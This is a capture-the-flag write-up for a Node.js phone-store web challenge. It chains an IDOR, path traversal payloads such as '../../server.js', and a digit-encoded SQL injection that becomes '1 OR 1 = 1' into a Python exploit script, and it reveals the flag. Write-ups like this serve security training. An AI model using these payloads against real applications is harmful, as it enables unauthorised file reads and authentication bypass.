# HASBLCTF Writeup: Mobile

**CTF Name:** HASBLCTF  
**Category:** Web Exploitation  
**Challenge/Task Name:** Mobile Store  
**Difficulty:** Medium/Hard  
**Author:** Phantom Blaze  
**Target URL:** `http://34.77.68.154:10205`

## Objective
Exploit vulnerabilities in a mobile phone store web application to unlock the secret area and retrieve the hidden flag.

## Solution / Walkthrough

### 1. Initial Reconnaissance
The application is a Node.js/Express web app for a mobile phone store. Inspecting the API endpoints, we discover:
- `/api/devlogs?id=<N>` — An **IDOR** (Insecure Direct Object Reference) vulnerability that leaks developer communications when accessed with `id=0`.
- `/api/gallery?file=<filename>` — A file viewer for gallery images.

### 2. Exploiting LFI (Local File Inclusion)
The gallery endpoint is vulnerable to **Path Traversal**. By using `../../` sequences, we can read arbitrary files from the server:

```
GET /api/gallery?file=../../server.js
```

This leaks the full backend source code (`server.js`), revealing the complete application logic.

### 3. Understanding the Unlock Mechanism
From the source code, we discover a sophisticated two-step exploit chain:

1. **Mapping Activation**: Reading `../../config/mapping.txt` via the gallery LFI sets a `mappingActivated` flag in the user's session. This also returns 4 dynamically generated numeric codes.
2. **Numeric SQL Injection**: When mapping is active, the `/api/unlock` endpoint (which only accepts digits) replaces the 4-digit codes in the PIN with SQL keywords (`OR`, `AND`, `=`, `1`), enabling a numeric-only SQLi payload.

### 4. The Exploit

```python
import requests

s = requests.Session()
base = 'http://34.77.68.154:10205'

# Step 1: Trigger LFI to activate mapping and get codes
r = s.get(f'{base}/api/gallery', params={'file': '../../config/mapping.txt'})
# Parse the mapping codes from the response
# Example: OR=3279, AND=1503, EQ=6244, ONE=3713

# Step 2: Construct numeric SQLi payload
# Target query: "SELECT flag FROM users WHERE pin = 1 OR 1 = 1"
# Encoded as: ONE + OR + ONE + EQ + ONE
pin = "37133279371362443713"

r = s.post(f'{base}/api/unlock', json={'pin': pin})
print(r.json())
```

### 5. Retrieving the Flag
The numeric PIN `37133279371362443713` is translated by the server into `1 OR 1 = 1`, causing the SQL query to return all rows and bypass authentication.

**Flag:**  
`HASBL{Sql_Wi7h_Numb3rs!}`
